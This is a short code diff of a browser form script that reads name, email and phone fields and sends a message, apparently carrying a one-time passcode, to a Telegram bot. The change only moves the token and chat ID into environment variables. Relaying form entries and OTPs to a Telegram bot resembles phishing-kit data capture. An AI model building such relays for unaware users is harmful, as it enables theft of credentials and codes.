@@ -1,5 +1,3 @@
-import config from './config';
-
 let name = document.querySelector("#name");
 let email = document.querySelector("#email");
 let phone = document.querySelector("#phone");
@@ -44,7 +42,7 @@ const submitForm = () => {
         `
 
         // send to telegram
-        const url = `https://api.telegram.org/bot${config.API_TOKEN}/sendMessage?chat_id=${config.CHAT_ID}&text=${otpSend}`;
+        const url = `https://api.telegram.org/bot${process.env.API_TOKEN}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${otpSend}`;
 
         fetch(url, {
             mode: 'cors',
